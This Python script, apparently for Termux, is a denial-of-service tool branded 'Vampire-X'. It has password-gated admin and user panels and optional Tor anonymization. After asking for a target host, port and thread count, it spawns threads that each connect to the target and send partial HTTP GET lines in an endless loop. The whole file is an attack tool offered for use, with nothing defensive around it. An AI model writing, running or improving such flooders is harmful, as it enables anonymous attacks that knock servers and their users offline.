import os
import sys
import time
import socket
import socks
import threading
import subprocess
from colorama import Fore, Style, init

init(autoreset=True)

# Admin & TOR Credentials
ADMIN_PASSWORD = "SH404"
TOR_PASSWORD = "SH404"

# Colorful Banner Functions
def admin_banner():
    print(Fore.RED + Style.BRIGHT + """
███████╗██╗░░░██╗██████╗░███╗░░░███╗██████╗░██╗███╗░░██╗███████╗██╗
██╔════╝╚██╗░██╔╝██╔══██╗████╗░████║██╔══██╗██║████╗░██║██╔════╝╚═╝
█████╗░░░╚████╔╝░██████╦╝██╔████╔██║██████╦╝██║██╔██╗██║█████╗░░░░░
██╔══╝░░░░╚██╔╝░░██╔══██╗██║╚██╔╝██║██╔══██╗██║██║╚████║██╔══╝░░░░░
███████╗░░░██║░░░██████╦╝██║░╚═╝░██║██████╦╝██║██║░╚███║███████╗██╗
╚══════╝░░░╚═╝░░░╚═════╝░╚═╝░░░░░╚═╝╚═════╝░╚═╝╚═╝░░╚══╝╚══════╝╚═╝
                   [ Vampire-X Admin Panel ]
""" + Style.RESET_ALL)

def user_banner():
    print(Fore.CYAN + Style.BRIGHT + """
██    ██ ██████  ██████  ██    ██ ██ ██████  ███████     ██
██    ██ ██   ██ ██   ██ ██    ██ ██ ██   ██ ██          ██
██    ██ ██████  ██████  ██    ██ ██ ██   ██ █████       ██
██    ██ ██      ██      ██    ██ ██ ██   ██ ██
 ██████  ██      ██       ██████  ██ ██████  ███████     ██
                [ Vampire-X User Panel ]
""" + Style.RESET_ALL)

# Tor Setup Function
def setup_tor():
    print(Fore.YELLOW + "[*] Checking TOR installation...")
    if subprocess.run(['which', 'tor'], capture_output=True).returncode != 0:
        print(Fore.YELLOW + "[*] TOR not found! Installing TOR...")
        os.system("pkg install tor -y")
    torrc_path = os.path.expanduser("~/.torrc")
    if not os.path.exists(torrc_path):
        with open(torrc_path, 'w') as f:
            f.write("SOCKSPort 9050\n")
    print(Fore.GREEN + "[*] Starting TOR service...")
    subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(6)
    print(Fore.GREEN + "[+] TOR routing active and anonymous mode enabled!")

# Attack Logic
def attack(target, port, thread_count, use_tor):
    def ddos():
        try:
            s = socks.socksocket()
            if use_tor:
                s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            s.connect((target, port))
            while True:
                s.sendto(b"GET / HTTP/1.1\r\n", (target, port))
        except Exception as e:
            print(Fore.RED + f"[!] Thread Error: {e}")
    print(Fore.GREEN + f"[>>] Attack Launched on {target}:{port} | Threads: {thread_count}")
    for _ in range(thread_count):
        threading.Thread(target=ddos).start()

# Auto Dependency Fix
def install_dependencies():
    try:
        import socks
        import colorama
    except:
        print(Fore.YELLOW + "[*] Installing missing dependencies...")
        os.system("pip install pysocks colorama")

# Main Controller
def main():
    os.system("clear")
    install_dependencies()

    mode = input(Fore.LIGHTMAGENTA_EX + "[?] Select Mode (admin/user): ").strip().lower()
    if mode == "admin":
        passwd = input(Fore.YELLOW + "[#] Admin Password: ")
        if passwd != ADMIN_PASSWORD:
            print(Fore.RED + "[X] Incorrect password!")
            sys.exit()
        admin_banner()
    elif mode == "user":
        user_banner()
    else:
        print(Fore.RED + "[X] Invalid Mode selected!")
        return

    anon = input(Fore.LIGHTMAGENTA_EX + "[?] Enable Anonymous Mode using TOR? (y/n): ").strip().lower()
    use_tor = False
    if anon == 'y':
        tor_pass = input(Fore.YELLOW + "[#] TOR Password: ")
        if tor_pass == TOR_PASSWORD:
            setup_tor()
            use_tor = True
        else:
            print(Fore.RED + "[X] TOR Authentication Failed!")
            return

    try:
        target = input(Fore.CYAN + "[+] Target IP/Host: ")
        port = int(input("[+] Target Port: "))
        threads = int(input("[+] Number of Threads: "))
        attack(target, port, threads, use_tor)
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")
        print(Fore.YELLOW + "[*] Attempting auto-fix...")
        time.sleep(1)
        install_dependencies()

# Execute
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Execution interrupted by user. Shutting down...")
